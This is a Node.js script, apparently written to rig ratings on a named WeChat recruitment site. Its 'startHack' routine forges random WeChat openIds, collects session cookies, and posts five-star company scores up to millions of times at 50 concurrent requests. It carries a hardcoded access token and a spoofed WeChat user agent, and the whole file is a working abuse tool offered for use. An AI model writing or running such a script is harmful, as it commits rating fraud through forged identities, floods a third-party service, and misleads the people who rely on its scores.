"use strict";

const request = require('request'),
      async = require("async");

const App = {},
      BASE_URL = 'http://h5.weldo.cn/zhaopin/index.php?index=2984&from=groupmessage&isappinstalled=0&openid=${fakeOpenId}&accesstoken=nJqKl4%2Br0HWIooWko6GreqeVecW5g7CmrpZlmqZs3KCnl7F%2FpZaplHesZLhvsc5xup%2BFz9ijkIdooZ6dlo3Upnhmnomad5eGlXaa16Woqni0foOb12iphot7oKGmmtulpIepiIaC0ox9q3zapYTSoJmolLWSjnKCm4qAlaKAsmKIdoCXd3Wjfol0',
      BASE_REQUEST_HEADERS = {
        'Host': 'h5.weldo.cn',
        'Connection': 'keep-alive',        
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 wechatdevtools/0.7.0 MicroMessenger/6.3.9 Language/zh_CN webview/0',
        'Accept-Language': 'en-US,en;q=0.8'
      };

const main = function () {
  startHack();
};

const startHack = function () {
  let succ = 0, fail = 0;
  async.timesLimit(65536 * 256 , 50, function (n, next) {
    let code = nextCode(),
        fakeOpenId = new Buffer(code, 'hex').toString('base64'),
        url = BASE_URL.replace('${fakeOpenId}', encodeURIComponent(fakeOpenId));
    request({
      url: url,
      followRedirect: false,
      headers: Object.assign({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1'
      }, BASE_REQUEST_HEADERS)
    }, function (err, response, body) {
      if (!err && response.headers['set-cookie']) {
        let cookies = response.headers['set-cookie'].map(function (c) {
          return c.split(';')[0].trim();
        });
        if (cookies.length) {
          request({
            url: 'http://h5.weldo.cn/zhaopin/ajax/index.php?op=companyscore',
            method: 'POST',
            body: 'score=5&index=2984',
            headers: Object.assign({
              'Content-Length': 18,
              'Accept': 'application/json, text/javascript, */*; q=0.01',
              'Origin': 'http://h5.weldo.cn',
              'X-Requested-With': 'XMLHttpRequest',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'Referer': 'http://h5.weldo.cn/zhaopin/index.php?index=2984',
              'Cookie': cookies.join('; ')
            }, BASE_REQUEST_HEADERS)
          }, function (err, response, body) {
            if (body && body.indexOf('true') >= 0) {
              succ ++;
            } else {
              fail ++;
            }
            console.log('%s, succ: %d, fail: %d', code, succ, fail);
            next();
          });
        } else {
          next();
        }      
      } else {
        console.log(body, response && response.headers);
        next();
      }
    });
  });  
};

const nextCode = function () {
  let code = '';
  for (let i = 0; i < 28; i++) {
    let n = (Math.ceil(Math.random() * 77) + 99).toString(16);
    if (n.length === 1) {
      n = '0' + n;
    }
    code += n;
   }
  return code;
};

main();
